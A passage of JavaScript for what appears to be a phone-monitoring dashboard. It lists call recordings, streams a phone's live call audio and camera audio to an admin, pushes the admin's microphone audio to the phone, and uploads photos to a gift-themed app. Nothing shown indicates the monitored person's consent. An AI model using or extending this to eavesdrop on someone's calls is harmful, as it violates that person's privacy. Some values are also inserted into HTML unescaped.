      </td>
    </tr>
  `;

  if (!config.adminEmail) {
    recordingsList.innerHTML = `
      <tr>
        <td colspan="5" style="text-align: center; padding: 30px; color: #f43f5e;">
          Please configure email settings first.
        </td>
      </tr>
    `;
    return;
  }

  try {
    const response = await fetch(`${config.serverUrl}/api/recordings?email=${encodeURIComponent(config.adminEmail)}`);
    if (!response.ok) {
      throw new Error(`HTTP error ${response.status}`);
    }

    const json = await response.json();
    if (json.success) {
      renderRecordings(json.recordings);
    } else {
      throw new Error(json.error || 'Failed to fetch recordings');
    }
  } catch (error) {
    console.error('Error loading recordings:', error);
    recordingsList.innerHTML = `
      <tr>
        <td colspan="5" style="text-align: center; padding: 30px; color: #f43f5e;">
          Failed to load recordings: ${error.message}
        </td>
      </tr>
    `;
  }
}

function renderRecordings(recordings) {
  const recordingsList = document.getElementById('recordings-list');
  if (!recordingsList) return;

  if (!recordings || recordings.length === 0) {
    recordingsList.innerHTML = `
      <tr>
        <td colspan="5" style="text-align: center; padding: 30px; color: #94A3B8;">
          No call recordings found yet.
        </td>
      </tr>
    `;
    return;
  }

  recordingsList.innerHTML = recordings.map(rec => {
    const dateStr = formatTimestamp(rec.timestamp);
    const sizeMB = (rec.size / (1024 * 1024)).toFixed(2);
    const playUrl = config.serverUrl + rec.url;
    const audioType = rec.filename.endsWith('.wav') ? 'audio/wav' : 'audio/mp4';

    return `
      <tr style="border-bottom: 1px solid var(--theme-border);">
        <td style="padding: 12px 8px; font-weight: 600; color: var(--theme-text);">${escapeHtml(rec.number)}</td>
        <td style="padding: 12px 8px; color: var(--theme-text);">${dateStr}</td>
        <td style="padding: 12px 8px; color: var(--theme-text);">${sizeMB} MB</td>
        <td style="padding: 12px 8px; text-align: center;">
          <audio controls preload="metadata" style="max-height: 30px; min-width: 200px;">
            <source src="${playUrl}" type="${audioType}">
            Your browser does not support the audio element.
          </audio>
        </td>
        <td style="padding: 12px 8px; text-align: center;">
          <a href="${playUrl}" download="${rec.filename}" class="recording-action-btn" title="Download">
            <i class="fa-solid fa-download"></i> Download
          </a>
          <button onclick="deleteRecording('${rec.id}')" class="recording-action-btn delete-btn" title="Delete">
            <i class="fa-solid fa-trash"></i> Delete
          </button>
        </td>
      </tr>
    `;
  }).join('');
}

function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

async function deleteRecording(recordingId) {
  if (!confirm('Are you sure you want to delete this call recording?')) {
    return;
  }

  showFeedback('Deleting recording...', 'info');

  try {
    const response = await fetch(`${config.serverUrl}/api/recordings/delete`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.adminToken}`
      },
      body: JSON.stringify({
        email: config.adminEmail,
        recordingId: recordingId
      })
    });

    const json = await response.json();
    if (json.success) {
      showFeedback('Recording deleted successfully!', 'success');
      loadRecordings();
    } else {
      showFeedback(`Failed to delete recording: ${json.error}`, 'error');
    }
  } catch (error) {
    showFeedback(`Error: ${error.message}`, 'error');
  }
}

// ==========================================
// LIVE HEARING & SPEAKING (AUDIO BRIDGE)
// ==========================================

let audioContext = null;
let hearStreamReader = null;
let isHearing = false;

let talkAudioContext = null;
let talkStream = null;
let talkProcessor = null;
let isTalking = false;

let cameraAudioContext = null;
let cameraAudioReader = null;
let isCameraAudioPlaying = false;
let isCameraAudioManuallyMuted = false;

// 1. Listen Live (Hear Phone Call)
const startHearBtn = document.getElementById('start-hear-btn');
const hearVisualizer = document.getElementById('hear-visualizer');

if (startHearBtn) {
  startHearBtn.addEventListener('click', async () => {
    if (isHearing) {
      stopHearing();
    } else {
      await startHearing();
    }
  });
}

async function startHearing() {
  try {
    startHearBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin" style="margin-right: 8px;"></i> Connecting...`;
    
    audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
    let nextStartTime = 0;
    
    const response = await fetch(`${config.serverUrl}/api/audio/stream?email=${encodeURIComponent(config.adminEmail)}&token=${encodeURIComponent(config.adminToken)}`);
    if (!response.ok) {
      throw new Error(`HTTP Error ${response.status}`);
    }
    
    isHearing = true;
    startHearBtn.innerHTML = `<i class="fa-solid fa-stop" style="margin-right: 8px;"></i> Stop Listening`;
    startHearBtn.style.borderColor = '#EF4444';
    startHearBtn.style.color = '#EF4444';
    hearVisualizer.style.display = 'flex';
    
    const reader = response.body.getReader();
    hearStreamReader = reader;
    
    while (isHearing) {
      const { done, value } = await reader.read();
      if (done) break;
      
      if (value && value.byteLength >= 2) {
        const view = new DataView(value.buffer, value.byteOffset, value.byteLength);
        const samplesCount = Math.floor(value.byteLength / 2);
        const float32Array = new Float32Array(samplesCount);
        for (let i = 0; i < samplesCount; i++) {
          float32Array[i] = view.getInt16(i * 2, true) / 32768.0;
        }
        
        if (audioContext.state === 'suspended') {
          await audioContext.resume();
        }
        
        const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
        audioBuffer.copyToChannel(float32Array, 0);
        
        const source = audioContext.createBufferSource();
        source.buffer = audioBuffer;
        source.connect(audioContext.destination);
        
        const currentTime = audioContext.currentTime;
        if (nextStartTime < currentTime) {
          nextStartTime = currentTime + 0.05;
        }
        source.start(nextStartTime);
        nextStartTime += audioBuffer.duration;
      }
    }
    stopHearing();
  } catch (err) {
    console.error('Failed to hear stream:', err);
    alert('Live audio stream connection failed. Make sure the phone is actively in a call and online!');
    stopHearing();
  }
}

function stopHearing() {
  isHearing = false;
  if (hearStreamReader) {
    try { hearStreamReader.cancel(); } catch (e) {}
    hearStreamReader = null;
  }
  if (audioContext) {
    try { audioContext.close(); } catch (e) {}
    audioContext = null;
  }
  if (startHearBtn) {
    startHearBtn.innerHTML = `<i class="fa-solid fa-play" style="margin-right: 8px;"></i> Start Listening`;
    startHearBtn.style.borderColor = '#6366F1';
    startHearBtn.style.color = '#6366F1';
  }
  if (hearVisualizer) {
    hearVisualizer.style.display = 'none';
  }
}

// 2. Speak Live (Talk to Phone)
const startTalkBtn = document.getElementById('start-talk-btn');
const talkIndicator = document.getElementById('talk-indicator');

if (startTalkBtn) {
  startTalkBtn.addEventListener('click', async () => {
    if (isTalking) {
      stopTalking();
    } else {
      await startTalking();
    }
  });
}

async function startTalking() {
  try {
    startTalkBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin" style="margin-right: 8px;"></i> Starting Mic...`;
    
    talkStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    
    talkAudioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
    const source = talkAudioContext.createMediaStreamSource(talkStream);
    
    talkProcessor = talkAudioContext.createScriptProcessor(4096, 1, 1);
    
    talkProcessor.onaudioprocess = (e) => {
      if (!isTalking) return;
      
      const float32Data = e.inputBuffer.getChannelData(0);
      const int16Data = new Int16Array(float32Data.length);
      for (let i = 0; i < float32Data.length; i++) {
        int16Data[i] = Math.max(-32768, Math.min(32767, float32Data[i] * 32768));
      }
      
      fetch(`${config.serverUrl}/api/audio/upload-web?email=${encodeURIComponent(config.adminEmail)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/octet-stream' },
        body: int16Data.buffer
      }).catch(err => console.error('Error uploading talk chunk:', err));
    };
    
    source.connect(talkProcessor);
    talkProcessor.connect(talkAudioContext.destination);
    
    isTalking = true;
    startTalkBtn.innerHTML = `<i class="fa-solid fa-stop" style="margin-right: 8px;"></i> Stop Talking`;
    startTalkBtn.style.borderColor = '#EF4444';
    startTalkBtn.style.color = '#EF4444';
    talkIndicator.style.display = 'block';
    
  } catch (err) {
    console.error('Failed to access microphone:', err);
    alert('Could not access your microphone. Please grant permission and try again!');
    stopTalking();
  }
}

function stopTalking() {
  isTalking = false;
  
  if (talkProcessor) {
    try { talkProcessor.disconnect(); } catch (e) {}
    talkProcessor = null;
  }
  if (talkStream) {
    try {
      talkStream.getTracks().forEach(track => track.stop());
    } catch (e) {}
    talkStream = null;
  }
  if (talkAudioContext) {
    try { talkAudioContext.close(); } catch (e) {}
    talkAudioContext = null;
  }
  if (startTalkBtn) {
    startTalkBtn.innerHTML = `<i class="fa-solid fa-microphone" style="margin-right: 8px;"></i> Start Talking`;
    startTalkBtn.style.borderColor = '#EC4899';
    startTalkBtn.style.color = '#EC4899';
  }
  if (talkIndicator) {
    talkIndicator.style.display = 'none';
  }
}

// 3. Camera Feed Audio Playback (Listen to Camera Audio)
async function startCameraAudio() {
  try {
    const cameraAudioBtn = document.getElementById('camera-audio-btn');
    if (!cameraAudioBtn) return;

    cameraAudioBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin" style="margin-right: 8px;"></i> Connecting...`;

    cameraAudioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
    let nextStartTime = 0;

    const response = await fetch(`${config.serverUrl}/api/audio/stream?email=${encodeURIComponent(config.adminEmail)}&token=${encodeURIComponent(config.adminToken)}`);
    if (!response.ok) {
      throw new Error(`HTTP Error ${response.status}`);
    }

    isCameraAudioPlaying = true;
    cameraAudioBtn.innerHTML = `<i class="fa-solid fa-volume-high" style="margin-right: 8px;"></i> Audio: Listening`;
    cameraAudioBtn.style.borderColor = '#10B981';
    cameraAudioBtn.style.color = '#10B981';

    const reader = response.body.getReader();
    cameraAudioReader = reader;

    while (isCameraAudioPlaying) {
      const { done, value } = await reader.read();
      if (done) break;

      if (value && value.byteLength >= 2) {
        const view = new DataView(value.buffer, value.byteOffset, value.byteLength);
        const samplesCount = Math.floor(value.byteLength / 2);
        const float32Array = new Float32Array(samplesCount);
        for (let i = 0; i < samplesCount; i++) {
          float32Array[i] = view.getInt16(i * 2, true) / 32768.0;
        }

        if (cameraAudioContext.state === 'suspended') {
          await cameraAudioContext.resume();
        }

        const audioBuffer = cameraAudioContext.createBuffer(1, float32Array.length, 16000);
        audioBuffer.copyToChannel(float32Array, 0);

        const source = cameraAudioContext.createBufferSource();
        source.buffer = audioBuffer;
        source.connect(cameraAudioContext.destination);

        const currentTime = cameraAudioContext.currentTime;
        if (nextStartTime < currentTime) {
          nextStartTime = currentTime + 0.05;
        }
        source.start(nextStartTime);
        nextStartTime += audioBuffer.duration;
      }
    }
    stopCameraAudio();
  } catch (err) {
    console.error('Failed to hear camera audio:', err);
    stopCameraAudio();
  }
}

function stopCameraAudio() {
  isCameraAudioPlaying = false;
  if (cameraAudioReader) {
    try { cameraAudioReader.cancel(); } catch (e) {}
    cameraAudioReader = null;
  }
  if (cameraAudioContext) {
    try { cameraAudioContext.close(); } catch (e) {}
    cameraAudioContext = null;
  }
  const cameraAudioBtn = document.getElementById('camera-audio-btn');
  if (cameraAudioBtn) {
    cameraAudioBtn.innerHTML = `<i class="fa-solid fa-volume-xmark" style="margin-right: 8px;"></i> Audio: Muted`;
    cameraAudioBtn.style.borderColor = '#EF4444';
    cameraAudioBtn.style.color = '#EF4444';
  }
}

// ==========================================
// PUCHKU GIFTS PHOTO GALLERY & UPLOAD
// ==========================================

function updatePhotosInputStatus() {
  const files = giftPhotosInput.files;
  const pText = giftUploadZone.querySelector('p');
  if (files && files.length > 0) {
    pText.textContent = `${files.length} photo(s) selected 📸`;
    pText.style.fontWeight = 'bold';
    pText.style.color = '#F43F5E';
  } else {
    pText.textContent = `Drag & drop images here or click to browse`;
    pText.style.fontWeight = 'normal';
    pText.style.color = '#64748B';
  }
}

async function loadGifts() {
  if (!giftsGrid) return;

  giftsGrid.innerHTML = `
    <div id="gifts-loading" style="grid-column: 1 / -1; text-align: center; padding: 40px; color: #94A3B8;">
      <i class="fa-solid fa-spinner fa-spin" style="font-size: 2rem; margin-bottom: 8px;"></i>
      <p>Loading photo gallery...</p>
    </div>
  `;

  if (!config.adminEmail) {
    giftsGrid.innerHTML = `
      <div style="grid-column: 1 / -1; text-align: center; padding: 40px; color: #f43f5e;">
        Please configure email settings first.
      </div>
    `;
    return;
  }

  try {
    const response = await fetch(`${config.serverUrl}/api/gifts?email=${encodeURIComponent(config.adminEmail)}`);
    if (!response.ok) {
      throw new Error(`HTTP error ${response.status}`);
    }

    const json = await response.json();
    if (json.success) {
      renderGifts(json.gifts);
    } else {
      throw new Error(json.error || 'Failed to fetch gifts');
    }
  } catch (error) {
    console.error('Error loading gifts:', error);
    giftsGrid.innerHTML = `
      <div style="grid-column: 1 / -1; text-align: center; padding: 40px; color: #f43f5e;">
        Failed to load gifts: ${error.message}
      </div>
    `;
  }
}

function renderGifts(gifts) {
  if (!giftsGrid) return;
  giftsGrid.innerHTML = '';

  if (!gifts || gifts.length === 0) {
    if (giftsEmptyMsg) {
      giftsGrid.appendChild(giftsEmptyMsg);
      giftsEmptyMsg.style.display = 'block';
    }
    return;
  }

  gifts.forEach(gift => {
    const card = document.createElement('div');
    card.className = 'gift-card';

    const img = document.createElement('img');
    img.src = config.serverUrl + gift.url;
    img.alt = 'Gift Photo';
    img.loading = 'lazy';

    const overlay = document.createElement('div');
    overlay.className = 'gift-card-overlay';

    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'gift-delete-btn';
    deleteBtn.innerHTML = '<i class="fa-solid fa-trash"></i>';
    deleteBtn.title = 'Delete photo';
    deleteBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      deleteGift(gift.id);
    });

    overlay.appendChild(deleteBtn);
    card.appendChild(img);
    card.appendChild(overlay);
    giftsGrid.appendChild(card);
  });
}

async function uploadGifts() {
  if (uploadGiftsBtn.classList.contains('disabled')) {
    showFeedback('Please connect your device first.', 'error');
    return;
  }

  const files = giftPhotosInput.files;
  if (!files || files.length === 0) {
    showFeedback('Please select one or more photos first.', 'error');
    return;
  }

  const formData = new FormData();
  for (let i = 0; i < files.length; i++) {
    formData.append('photos', files[i]);
  }

  uploadGiftsBtn.disabled = true;
  uploadGiftsBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Uploading...';
  uploadGiftsProgress.style.display = 'block';
  uploadGiftsBar.style.width = '0%';
  uploadGiftsStatus.textContent = 'Uploading files to server...';
  uploadGiftsStatus.style.color = '#64748B';

  try {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', `${config.serverUrl}/api/gifts/upload?email=${encodeURIComponent(config.adminEmail)}`, true);
    xhr.setRequestHeader('Authorization', `Bearer ${config.adminToken}`);

    xhr.upload.onprogress = (e) => {
      if (e.lengthComputable) {
        const percentComplete = Math.round((e.loaded / e.total) * 100);
        uploadGiftsBar.style.width = percentComplete + '%';
        uploadGiftsStatus.textContent = `Uploading: ${percentComplete}%`;
      }
    };

    xhr.onload = () => {
      uploadGiftsBtn.disabled = false;
      uploadGiftsBtn.innerHTML = '<i class="fa-solid fa-upload"></i> Upload to App';

      if (xhr.status === 200) {
        const json = JSON.parse(xhr.responseText);
        if (json.success) {
          uploadGiftsStatus.textContent = 'Upload completed successfully! 🎉';
          uploadGiftsStatus.style.color = '#10B981';
          showFeedback('Photos uploaded successfully!', 'success');
          // Reset input
          giftPhotosInput.value = '';
          updatePhotosInputStatus();
          // Reload gifts
          loadGifts();
          setTimeout(() => {
            uploadGiftsProgress.style.display = 'none';
          }, 3000);
        } else {
          uploadGiftsStatus.textContent = `Upload failed: ${json.error || 'Server error'}`;
          uploadGiftsStatus.style.color = '#EF4444';
          showFeedback('Upload failed.', 'error');
        }
      } else {
        uploadGiftsStatus.textContent = `Server responded with status: ${xhr.status}`;
        uploadGiftsStatus.style.color = '#EF4444';
        showFeedback('Upload failed.', 'error');
      }
    };

    xhr.onerror = () => {
      uploadGiftsBtn.disabled = false;
      uploadGiftsBtn.innerHTML = '<i class="fa-solid fa-upload"></i> Upload to App';
      uploadGiftsStatus.textContent = 'Network error during upload.';
      uploadGiftsStatus.style.color = '#EF4444';
      showFeedback('Upload failed due to network error.', 'error');
    };

    xhr.send(formData);
  } catch (err) {
    console.error('Upload catch error:', err);
    uploadGiftsBtn.disabled = false;
    uploadGiftsBtn.innerHTML = '<i class="fa-solid fa-upload"></i> Upload to App';
    uploadGiftsStatus.textContent = `Error: ${err.message}`;
    uploadGiftsStatus.style.color = '#EF4444';
  }
}

async function deleteGift(giftId) {
  if (!confirm('Are you sure you want to delete this photo from your gifts?')) {
    return;
  }

  showFeedback('Deleting photo...', 'info');

  try {
    const response = await fetch(`${config.serverUrl}/api/gifts/delete`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.adminToken}`
      },
      body: JSON.stringify({
        email: config.adminEmail,
        giftId: giftId
      })
    });

    const json = await response.json();
    if (json.success) {
      showFeedback('Photo deleted successfully!', 'success');
      loadGifts();
    } else {
      showFeedback(`Failed to delete: ${json.error}`, 'error');
    }
  } catch (error) {
    showFeedback(`Error: ${error.message}`, 'error');
  }
}


